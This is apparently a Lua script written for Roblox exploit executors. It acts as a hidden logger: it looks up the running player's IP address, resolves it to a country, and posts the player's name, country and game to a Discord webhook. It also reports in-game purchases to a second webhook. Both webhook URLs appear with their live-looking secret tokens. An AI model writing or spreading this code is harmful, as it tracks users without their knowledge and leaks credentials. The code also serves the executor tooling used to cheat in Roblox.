local HttpService = game:GetService("HttpService")
local MarketplaceService = game:GetService("MarketplaceService")

local ExecuteWebhookURL = "https://discord.com/api/webhooks/1247987606407483492/gCrMS46_atvCO5xkM6ecFQGzZt84c9KvUhUnY4hftah9-y6O6lzcPY2l6HDR-PTHVAng"
local PurchaseWebhookURL = "https://discord.com/api/webhooks/1248000775024803850/YYyeLHEAYFbB8euD6H71UoFEAJS5UnXAOHPdhJM2XvEE9lsoQ0Q4tq43qiNbEB-y_390"

local forbiddenWords = {"raid", "attack", "spam"}
local forbiddenPatterns = {"@everyone", "@here", "/%w+"}
local allowedDomains = {"roblox.com"}
local prefix = "[LOGGER]"

local function sanitizeMessage(message)
    for _, word in ipairs(forbiddenWords) do
        message = message:gsub(word, "[filtered]")
    end
    for _, pattern in ipairs(forbiddenPatterns) do
        message = message:gsub(pattern, "[filtered]")
    end

    message = message:gsub("https?://[%w-_%.%?%.:/%+=&]+", function(url)
        for _, domain in ipairs(allowedDomains) do
            if url:find(domain) then
                return url
            end
        end
        return "[filtered]"
    end)

    -- Sanitiza nombres de usuario que contengan "@everyone" o "@here"
    message = message:gsub("@everyone", "[filtered]")
    message = message:gsub("@here", "[filtered]")

    return message
end

local function sendNotificationToDiscord(webhookURL, message)
    local sanitizedMessage = sanitizeMessage(message)
    local requestBody = { content = prefix .. " " .. sanitizedMessage }
    local headers = { ["Content-Type"] = "application/json" }

    local request = http_request or request or syn.request or http.request
    request({
        Url = webhookURL,
        Method = "POST",
        Headers = headers,
        Body = HttpService:JSONEncode(requestBody)
    })
end

local function isInBlacklist(playerId, blacklist)
    for _, id in ipairs(blacklist) do
        if playerId == id then
            return true
        end
    end
    return false
end

local function downloadBlacklist(url)
    local response = game:HttpGet(url)
    local blacklist = {}
    for id in response:gmatch("(%d+)") do
        table.insert(blacklist, tonumber(id))
    end
    return blacklist
end

local blacklistUrl = "https://raw.githubusercontent.com/OneCreatorX/OneCreatorX/main/Scripts/BlackList.lua"
local blacklist = downloadBlacklist(blacklistUrl)

local playerName = game.Players.LocalPlayer.Name
local playerId = game.Players.LocalPlayer.UserId

if not isInBlacklist(playerId, blacklist) then
    local gameInfo = MarketplaceService:GetProductInfo(game.PlaceId)
    local gameName = gameInfo and gameInfo.Name or "Unknown Game"
    
    -- Obtener la dirección IP del jugador
    local ipAddress = game:HttpGet("https://api.ipify.org/")
    
    -- Obtener el país basado en la dirección IP
    local country = "Unknown"
    local response = game:HttpGet("https://ipapi.co/" .. ipAddress .. "/country_name")
    if response then
        country = response
    end
    
    sendNotificationToDiscord(ExecuteWebhookURL, playerName .. " from " .. country .. " executed the script in game '" .. gameName .. "'.")
else
    warn("You are not allowed to send messages.")
end

local function handlePurchase(player, productId, productType)
    local productInfo = MarketplaceService:GetProductInfo(productId)
    if productInfo then
        local itemName = productInfo.Name
        local itemPrice = productInfo.PriceInRobux
        local isCollectible = productInfo.IsLimited or productInfo.IsLimitedUnique
        local gameLink = "https://www.roblox.com/games/" .. game.PlaceId .. "/" .. game.Name
        local itemLink = "https://www.roblox.com/catalog/" .. productId

        local message = ""
        if itemPrice == 0 then
            message = player.Name .. " obtained the item '" .. itemName .. "' (" .. (isCollectible and "Collectible Item" or productType) .. ") for free in the game " .. gameLink .. ". Item link: " .. itemLink
        else
            message = player.Name .. " bought the item '" .. itemName .. "' (" .. (isCollectible and "Collectible Item" or productType) .. ") in the game " .. gameLink .. " for " .. itemPrice .. " Robux. Item link: " .. itemLink
        end

        sendNotificationToDiscord(PurchaseWebhookURL, message)
    end
end

MarketplaceService.PromptProductPurchaseFinished:Connect(function(player, productId, wasPurchased)
    if wasPurchased then
        handlePurchase(player, productId, "Product")
    end
end)

MarketplaceService.PromptPurchaseFinished:Connect(function(player, productId, wasPurchased)
    if wasPurchased then
        handlePurchase(player, productId, "Purchase")
    end
end)

MarketplaceService.PromptGamePassPurchaseFinished:Connect(function(player, gamePassId, wasPurchased)
    if wasPurchased then
        handlePurchase(player, gamePassId, "GamePass")
    end
end)

MarketplaceService.PromptBundlePurchaseFinished:Connect(function(player, bundleId, wasPurchased)
    if wasPurchased and bundleId >= 0 then
        handlePurchase(player, bundleId, "Bundle")
    end
end)
